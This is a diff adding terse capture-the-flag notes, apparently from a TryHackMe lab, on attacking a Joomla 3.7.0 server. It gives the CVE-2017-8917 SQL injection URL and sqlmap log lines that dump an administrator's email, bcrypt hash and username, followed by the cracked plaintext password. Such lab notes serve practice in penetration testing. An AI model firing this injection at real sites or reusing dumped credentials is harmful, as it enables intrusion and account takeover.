@@ -1,0 +1,17 @@
+Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+Joombla version: 3.7.0  http://localhost:8080/administrator/manifests/files/joomla.xml
+
+
+Vuln:
+   CVE-2017-8917
+   vulnerable url: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
+
+[23:28:01] [INFO] retrieved: jonah@tryhackme.com
+[23:28:01] [INFO] retrieved: 811
+[23:28:01] [INFO] retrieved: Super User
+[23:28:01] [INFO] retrieved: 
+[23:28:02] [INFO] retrieved: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
+[23:28:02] [INFO] retrieved: jonah 
+plaintext: spiderman123
+
+
